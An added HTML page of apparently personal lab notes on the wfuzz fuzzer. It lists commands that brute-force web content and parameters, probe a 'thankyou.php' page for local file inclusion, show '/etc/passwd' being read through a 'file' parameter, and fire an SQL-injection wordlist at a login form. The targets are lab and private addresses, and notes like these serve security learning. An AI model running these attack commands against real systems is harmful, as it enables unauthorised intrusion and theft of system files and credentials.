@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>wfuzz</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>wfuzz</h1><br/><a href=""><img src="images/1591-1.png" alt="images/1591-1.png" /></a><br /><a href=""><img src="images/1591-2.png" alt="images/1591-2.png" /></a><br />wfuzz -c -z file,~/Desktop/UVW.txt jewel.uploadvulns.thm/content/FUZZ.jpeg<br />wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -w /usr/share/seclists/Fuzzing/LFI-LFISuite-pathtotest.txt -u <a href="http://192.168.11.130/thankyou.php?FUZZ=FUZ2Z">http://192.168.11.130/thankyou.php?FUZZ=FUZ2Z</a> | grep -v 851 | grep -v 835 &gt; LFIList.txt<br /><a href="http://192.168.11.130/thankyou.php?file=/etc/passwd">http://192.168.11.130/thankyou.php?file=/etc/passwd</a>  &lt;&lt;&lt; paramater name file was found as well as pathtohost /etc/passwd<br />^^used to brute force a get request to a webpage<br />wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/SVNDigger/all-extensionless.txt -u <a href="http://192.168.11.130/thankyou.php?file=FUZZ">http://192.168.11.130/thankyou.php?file=FUZZ</a> | grep -v 835                     &lt;&lt;&lt;use against url<br />wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/SQL.txt -d &quot;myusername=john&amp;mypassword=FUZZ&amp;Submit=Login&quot;  <a href="http://192.168.11.8/checklogin.php">http://192.168.11.8/checklogin.php</a>             &lt;&lt;&lt;use against page input</div></body></html>
